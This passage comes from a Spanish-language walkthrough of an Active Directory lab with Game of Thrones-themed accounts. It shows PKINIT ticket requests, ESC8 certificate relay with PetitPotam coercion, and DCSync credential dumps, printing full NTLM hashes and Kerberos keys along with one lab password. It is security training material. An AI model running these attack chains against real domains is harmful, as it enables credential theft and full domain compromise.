+   2   │ 
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Se solicitará un TGT utilizando la herramienta [**gettgtpkinit](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py)** Esto se realizará con el siguiente comando: **`gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'`**
+
+```csharp
+┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #gettgtpkinit.py -pfx-base64 $(cat cert.b64) 'essos.local'/'meereen$' 'meereen.ccache'
+2023-08-26 19:53:09,911 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-08-26 19:53:10,488 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-08-26 19:53:22,259 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2023-08-26 19:53:22,259 minikerberos INFO     c276093b3139097619ba8b4d40222e77f81403be720ce5e3356491d65a048b87
+INFO:minikerberos:c276093b3139097619ba8b4d40222e77f81403be720ce5e3356491d65a048b87
+2023-08-26 19:53:22,267 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+```
+
+A continuación, se exportará este ticket para llevar a cabo el proceso de DCsync y obtener todo el contenido de NTDS.dit.
+
+confirmar el ticket 
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #ll meereen.ccache 
+Permissions Size User        Date Modified Name
+.rwxrwxrwx  1,4k angussmoody 26 ago 19:53  meereen.ccache
+```
+
+Luego, procedemos a exportar el ticket utilizando el comando **`export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
+```
+
+Con los pasos anteriores completados, se procede a ejecutar el DCsync mediante el siguiente comando:**`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
+BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
+SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
+krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
+krbtgt:des-cbc-md5:c8a708384cefa12f
+daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
+daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
+daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
+viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
+viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
+viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
+khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
+khal.drogo:des-cbc-md5:b5ec4c1032ef020d
+jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
+jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
+jorah.mormont:des-cbc-md5:b926916289464ffb
+sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
+sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
+sql_svc:des-cbc-md5:91d6b0df31b52a3d
+angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
+angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
+angussmoody:des-cbc-md5:43a4ec689b58fe38
+MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
+MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
+MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
+BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
+BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
+BRAAVOS$:des-cbc-md5:1af7750262dfb046
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
+SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
+[*] Cleaning up...
+```
+
+---
+
+## **ESC8 - with certipy**
+
+En primer lugar, se instala la herramienta [**certipy**](https://github.com/ly4k/Certipy) utilizando el comando: **`pip3 install certipy-ad`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #pip3 install certipy-ad
+Collecting certipy-ad
+  Downloading certipy_ad-4.7.0-py3-none-any.whl (129 kB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 129.9/129.9 kB 4.2 MB/s eta 0:00:00
+Requirement already satisfied: ldap3 in /usr/lib/python3/dist-packages (from certipy-ad) (2.8.1)
+Requirement already satisfied: dsinternals in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (1.2.4)
+Requirement already satisfied: unicrypto in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (0.0.10)
+Collecting pyopenssl>=23.0.0
+  Using cached pyOpenSSL-23.2.0-py3-none-any.whl (59 kB)
+Requirement already satisfied: impacket in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (0.11.0)
+Collecting pycryptodome
+  Downloading pycryptodome-3.18.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 2.1/2.1 MB 15.8 MB/s eta 0:00:00
+Requirement already satisfied: pyasn1==0.4.8 in /usr/lib/python3/dist-packages (from certipy-ad) (0.4.8)
+Requirement already satisfied: requests-ntlm in /usr/lib/python3/dist-packages (from certipy-ad) (1.1.0)
+Requirement already satisfied: dnspython in /usr/lib/python3/dist-packages (from certipy-ad) (2.0.0)
+Collecting cryptography>=39.0
+  Downloading cryptography-41.0.3-cp37-abi3-manylinux_2_28_x86_64.whl (4.3 MB)
+     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 4.3/4.3 MB 14.9 MB/s eta 0:00:00
+Requirement already satisfied: asn1crypto in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (1.5.1)
+Requirement already satisfied: requests in /usr/local/lib/python3.9/dist-packages (from certipy-ad) (2.28.1)
+Requirement already satisfied: cffi>=1.12 in /usr/lib/python3/dist-packages (from cryptography>=39.0->certipy-ad) (1.14.5)
+Requirement already satisfied: six in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (1.16.0)
+Requirement already satisfied: pycryptodomex in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (3.9.7)
+Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (2.0.1)
+Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (0.18.2)
+Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket->certipy-ad) (0.9.3)
+Requirement already satisfied: charset-normalizer in /usr/local/lib/python3.9/dist-packages (from impacket->certipy-ad) (2.1.1)
+Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (2.10)
+Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (2022.9.24)
+Requirement already satisfied: urllib3<1.27,>=1.21.1 in /usr/lib/python3/dist-packages (from requests->certipy-ad) (1.26.5)
+Installing collected packages: pycryptodome, cryptography, pyopenssl, certipy-ad
+  Attempting uninstall: cryptography
+    Found existing installation: cryptography 38.0.1
+    Uninstalling cryptography-38.0.1:
+      Successfully uninstalled cryptography-38.0.1
+  Attempting uninstall: pyopenssl
+    Found existing installation: pyOpenSSL 22.1.0
+    Uninstalling pyOpenSSL-22.1.0:
+      Successfully uninstalled pyOpenSSL-22.1.0
+Successfully installed certipy-ad-4.7.0 cryptography-41.0.3 pycryptodome-3.18.0 pyopenssl-23.2.0
+WARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv
+--- Logging error ---
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 177, in emit
+    self.console.print(renderable, overflow="ignore", crop=False, style=style)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1673, in print
+    extend(render(renderable, render_options))
+  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1305, in render
+    for render_output in iter_render:
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 134, in __rich_console__
+    for line in lines:
+  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/segment.py", line 249, in split_lines
+    for segment in segments:
+  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/console.py", line 1283, in render
+    renderable = rich_cast(renderable)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_vendor/rich/protocol.py", line 36, in rich_cast
+    renderable = cast_method()
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 130, in __rich__
+    pip_cmd = get_best_invocation_for_this_pip()
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/entrypoints.py", line 58, in get_best_invocation_for_this_pip
+    if found_executable and os.path.samefile(
+  File "/usr/lib/python3.9/genericpath.py", line 101, in samefile
+    s2 = os.stat(f2)
+FileNotFoundError: [Errno 2] No existe el fichero o el directorio: '/usr/bin/pip'
+Call stack:
+  File "/usr/local/bin/pip3", line 8, in <module>
+    sys.exit(main())
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/main.py", line 70, in main
+    return command.main(cmd_args)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 101, in main
+    return self._main(args)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/base_command.py", line 223, in _main
+    self.handle_pip_version_check(options)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/cli/req_command.py", line 190, in handle_pip_version_check
+    pip_self_version_check(session, options)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/self_outdated_check.py", line 236, in pip_self_version_check
+    logger.warning("[present-rich] %s", upgrade_prompt)
+  File "/usr/lib/python3.9/logging/__init__.py", line 1454, in warning
+    self._log(WARNING, msg, args, **kwargs)
+  File "/usr/lib/python3.9/logging/__init__.py", line 1585, in _log
+    self.handle(record)
+  File "/usr/lib/python3.9/logging/__init__.py", line 1595, in handle
+    self.callHandlers(record)
+  File "/usr/lib/python3.9/logging/__init__.py", line 1657, in callHandlers
+    hdlr.handle(record)
+  File "/usr/lib/python3.9/logging/__init__.py", line 948, in handle
+    self.emit(record)
+  File "/usr/local/lib/python3.9/dist-packages/pip/_internal/utils/logging.py", line 179, in emit
+    self.handleError(record)
+Message: '[present-rich] %s'
+Arguments: (UpgradePrompt(old='22.2.2', new='23.2.1'),)
+```
+
+Una vez instalada, la herramienta Certipy se ejecuta con el siguiente comando:**`certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController`** Luego, la herramienta quedará en espera de actividad.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting http://192.168.56.23/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+```
+
+Una vez que Certipy está en espera, ejecutamos la herramienta PetitPotam con el comando:**`PetitPotam.py 192.168.56.104 meereen.essos.local`** para llevar a cabo la coerción de autenticación.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody]
+└──╼ #PetitPotam.py 192.168.56.104 meereen.essos.local
+
+                                                                                               
+              ___            _        _      _        ___            _                     
+             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
+             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
+            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
+          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
+          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
+                                         
+              PoC to elicit machine account authentication via some MS-EFSRPC functions
+                                      by topotam (@topotam77)
+      
+                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN
+
+Trying pipe lsarpc
+[-] Connecting to ncacn_np:meereen.essos.local[\PIPE\lsarpc]
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+Después de que el ataque se completa, podemos revisar los resultados de Certipy y notar que ha exportado un archivo llamado "meereen.pfx”
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy relay -target 'http://192.168.56.23' -ca 192.168.56.23 -template DomainController
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting http://192.168.56.23/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+ESSOS\MEEREEN$
+[*] Requesting certificate for 'ESSOS\\MEEREEN$' based on the template 'DomainController'
+[-] Got error: timed out
+[-] Use -debug to print a stacktrace
+ESSOS\MEEREEN$
+[*] Requesting certificate for 'ESSOS\\MEEREEN$' based on the template 'DomainController'
+[*] Got certificate with DNS Host Name 'meereen.essos.local'
+[*] Certificate has no object SID
+[*] Saved certificate and private key to 'meereen.pfx'
+[*] Exiting...
+```
+
+Utilizando el archivo PFX generado, ahora procedemos a crear un ticket con la misma herramienta Certipy. Ejecutamos el siguiente comando: **`certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy auth -pfx meereen.pfx -dc-ip 192.168.56.12
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Using principal: meereen$@essos.local
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'meereen.ccache'
+[*] Trying to retrieve NT hash for 'meereen$'
+[*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a
+```
+
+La herramienta exportará un archivo llamado "meereen.ccache" una vez que el proceso se haya completado.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #ll meereen.ccache 
+Permissions Size User        Date Modified Name
+.rwxrwxrwx  1,4k angussmoody 28 ago 21:17  meereen.ccache
+```
+
+A continuación, exportaremos el ticket utilizando el comando: **`export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache`**
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #export KRB5CCNAME=/mnt/angussMoody/Goadv2/meereen.ccache
+```
+
+Una vez que se haya exportado el ticket, se ejecuta el ataque DCsync con el comando:**`secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`**
+
+```csharp
+┌─[✗]─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #secretsdump.py -k -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
+BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
+SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
+krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
+krbtgt:des-cbc-md5:c8a708384cefa12f
+daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
+daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
+daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
+viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
+viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
+viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
+khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
+khal.drogo:des-cbc-md5:b5ec4c1032ef020d
+jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
+jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
+jorah.mormont:des-cbc-md5:b926916289464ffb
+sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
+sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
+sql_svc:des-cbc-md5:91d6b0df31b52a3d
+angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
+angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
+angussmoody:des-cbc-md5:43a4ec689b58fe38
+MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
+MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
+MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
+BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
+BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
+BRAAVOS$:des-cbc-md5:1af7750262dfb046
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
+SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
+[*] Cleaning up...
+```
+
+También puedes llevar a cabo el ataque DCsync utilizando el comando:  **`secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local`** En este caso, se utiliza el hash proporcionado por la herramienta Certipy.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #secretsdump.py -hashes ':b50102c4722c9481fc31747a0d0c336a' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82199d0eb8901cba42316debbb953240:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+daenerys.targaryen:1110:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
+viserys.targaryen:1111:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
+khal.drogo:1112:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
+jorah.mormont:1113:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
+sql_svc:1114:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
+angussmoody:1115:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e:::
+MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:b50102c4722c9481fc31747a0d0c336a:::
+BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:1360f96a3845a2385b97d98f6fefa033:::
+SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:d8cdf6de89cfc88ea30464747fb8500f:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:b46977016f518d492039b32b58925cf9b4192ea145fe2b1d0c2e40e44df021f9
+krbtgt:aes128-cts-hmac-sha1-96:d2ecac8e0dd5c4b0190c3dde4ad0862c
+krbtgt:des-cbc-md5:c8a708384cefa12f
+daenerys.targaryen:aes256-cts-hmac-sha1-96:cf091fbd07f729567ac448ba96c08b12fa67c1372f439ae093f67c6e2cf82378
+daenerys.targaryen:aes128-cts-hmac-sha1-96:eeb91a725e7c7d83bfc7970532f2b69c
+daenerys.targaryen:des-cbc-md5:bc6ddf7ce60d29cd
+viserys.targaryen:aes256-cts-hmac-sha1-96:b4124b8311d9d84ee45455bccbc48a108d366d5887b35428075b644e6724c96e
+viserys.targaryen:aes128-cts-hmac-sha1-96:4b34e2537da4f1ac2d16135a5cb9bd3e
+viserys.targaryen:des-cbc-md5:70528fa13bc1f2a1
+khal.drogo:aes256-cts-hmac-sha1-96:2ef916a78335b11da896216ad6a4f3b1fd6276938d14070444900a75e5bf7eb4
+khal.drogo:aes128-cts-hmac-sha1-96:7d76da251df8d5cec9bf3732e1f6c1ac
+khal.drogo:des-cbc-md5:b5ec4c1032ef020d
+jorah.mormont:aes256-cts-hmac-sha1-96:286398f9a9317f08acd3323e5cef90f9e84628c43597850e22d69c8402a26ece
+jorah.mormont:aes128-cts-hmac-sha1-96:896e68f8c9ca6c608d3feb051f0de671
+jorah.mormont:des-cbc-md5:b926916289464ffb
+sql_svc:aes256-cts-hmac-sha1-96:ca26951b04c2d410864366d048d7b9cbb252a810007368a1afcf54adaa1c0516
+sql_svc:aes128-cts-hmac-sha1-96:dc0da2bdf6dc56423074a4fd8a8fa5f8
+sql_svc:des-cbc-md5:91d6b0df31b52a3d
+angussmoody:aes256-cts-hmac-sha1-96:da6575ba99aeed92d15fbfe9b23a1c4e8b5c46b9c5db9da8c672f619200d1880
+angussmoody:aes128-cts-hmac-sha1-96:7e3cf40500816ea8b445cbd9e25d1ea1
+angussmoody:des-cbc-md5:43a4ec689b58fe38
+MEEREEN$:aes256-cts-hmac-sha1-96:ad23285a83e260adbd2aed490c76294ed7de3caafd191da9f97590e98b0d1dda
+MEEREEN$:aes128-cts-hmac-sha1-96:3401d711a4ffc14bde85aa5438f59ab4
+MEEREEN$:des-cbc-md5:b3f1a1f2618667c8
+BRAAVOS$:aes256-cts-hmac-sha1-96:8b7984362695ea881eb2fd82dee4b186614db5d181abe80ed6db606b6844ed43
+BRAAVOS$:aes128-cts-hmac-sha1-96:631f3578b29fa024d17d679fb3fbe2a5
+BRAAVOS$:des-cbc-md5:1af7750262dfb046
+SEVENKINGDOMS$:aes256-cts-hmac-sha1-96:5a48434fe32d2ccead3abe27f87ac46cb528f42fc2d9af1050b48f325b4d3937
+SEVENKINGDOMS$:aes128-cts-hmac-sha1-96:3464c356265d6a44d426722c061b56c9
+SEVENKINGDOMS$:des-cbc-md5:c4f8f494aeef0de9
+[*] Cleaning up...
+```
+
+---
+
+## **ADCS enumeración con certipy y bloodhound**
+
+Utilizando la herramienta [**certipy**](https://github.com/ly4k/Certipy) para realizar una enumeración de las ADCS, para esto ejecutamos el comando **`certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12`** Como resultado, se obtiene un volcado de información que incluye tres archivos: un archivo de texto, un archivo JSON y un archivo ZIP, que se pueden cargar en BloodHound.
+
+```csharp
+┌─[root@angussmoody]─[/mnt/angussMoody/Goadv2]
+└──╼ #certipy find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 38 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 16 enabled certificate templates
+[*] Trying to get CA configuration for 'ESSOS-CA' via CSRA
+[*] Got CA configuration for 'ESSOS-CA'
+[*] Saved BloodHound data to '20230829200454_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
+[*] Saved text output to '20230829200454_Certipy.txt'
+[*] Saved JSON output to '20230829200454_Certipy.json'
+```
+
